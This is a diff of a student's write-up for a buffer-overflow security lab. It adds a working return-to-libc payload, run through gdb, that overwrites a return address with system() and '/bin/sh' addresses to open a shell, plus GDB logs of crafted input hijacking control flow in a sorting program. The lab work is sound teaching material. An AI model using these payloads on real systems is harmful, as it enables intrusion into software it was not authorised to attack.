@@ -46,7 +46,7 @@ After causing the program to crash, you must then try to find what the proper in
 
 To exploit we want the system to open a shell.  To do this we must develop shell code that will place the code we are trying to execute into the buffer we are overflowing and overwrite the return address so it points back into the buffer.  
 
-To do this we must locate where the ```system``` call resides on our machine.  Using help from a Piazza thread []
+To do this we must locate where the ```system``` call resides on our machine.  The following steps were outlined on a Piazza thread [here](https://piazza.com/class/ij905n686w44wb?cid=69)
 
 ```
 (gdb) b main
@@ -197,7 +197,7 @@ But do to the way these are pushed onto the stack, we need to reverse them and i
 ```12345678123456781234``` + the shellcode for system() +```\x90\x61\xe5\xb7``` + ```a dumb return address``` + the location for ```sh``` ```\x11\xde\xff\xb7``` 
 
 
-or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\xf5\x40\xf7\xb7```
+or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\x11\xde\xff\xb7```
 
 ```
 (gdb) r `python -c 'print "12345678123456781234\x90\x61\xe5\xb7RETA\x11\xde\xff\xb7"'`
@@ -206,6 +206,102 @@ or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\xf5\x40\xf7\xb7```
 # Task 2:
 
 ###Task 2.1 Buffer overflow detection data craft and overflow proof in GDB (10 points)
+
+To craft this buffer overflow I tested a series of data and found that anything over 12 elements would crash.
+
+#MAY NEED TO UPDATE THIS ON HOME MACHINE
+
+
+```
+(gdb) r data2.txt                                                                                                               
+Source list:                                                                                                                    
+0x1                                                                                                                             
+0x2                                                                                                                             
+0x3                                                                                                                             
+0x4                                                                                                                             
+0x5                                                                                                                             
+0x6                                                                                                                             
+0x7                                                                                                                             
+0x8                                                                                                                             
+0x9                                                                                                                             
+0xa                                                                                                                             
+0xb                                                                                                                             
+0xc                                                                                                                             
+0xd                                                                                                                             
+                                                                                                                                
+Sorted list in ascending order:                                                                                                 
+1                                                                                                                               
+2                                                                                                                               
+3                                                                                                                               
+4                                                                                                                               
+5                                                                                                                               
+6                                                                                                                               
+7                                                                                                                               
+8                                                                                                                               
+9                                                                                                                               
+a                                                                                                                               
+b                                                                                                                               
+c                                                                                                                               
+d                                                                                                                               
+                                                                                                                                
+Program received signal SIGSEGV, Segmentation fault.                                                                            
+0x08048724 in main ()                                                                                                           
+(gdb) r data2.txt                                                                                                               
+Source list:                                                                                                                    
+0x1                                                                                                                             
+0x2                                                                                                                             
+0x3                                                                                                                             
+0x4                                                                                                                             
+0x5                                                                                                                             
+0x6                                                                                                                             
+0x7                                                                                                                             
+0x8                                                                                                                             
+0x9                                                                                                                             
+0xa                                                                                                                             
+0xb                                                                                                                             
+0xc                          
+```
+
+I then experiments to see if I could modify the return address to system, similar to the method described in the previous task.  i played with serveral ways, since the sorting would jumble my shellcode initially but found that inputting 0 for all areas (except for where I wanted my return overwrite to happen) was easy and efficient
+
+```
+(gdb) r data.txt                                                                                                                
+Source list:                                                                                                                    
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x0                                                                                                                             
+0x1234567                                                                                                                       
+                                                                                                                                
+Sorted list in ascending order:                                                                                                 
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+0                                                                                                                               
+1234567                                                                                                                         
+                                                                                                                                
+Program received signal SIGSEGV, Segmentation fault.                                                                            
+0x01234567 in ?? ()                                              
+```
+
 ###Task 2.2. Locate system() address in GDB (10 points)
 ###Task 2.3. Locate /bin/sh address in GDB(10 points)
 ###Task 2.4. Correct exploit payload in data.txt and being able to open the shell in terminal(30
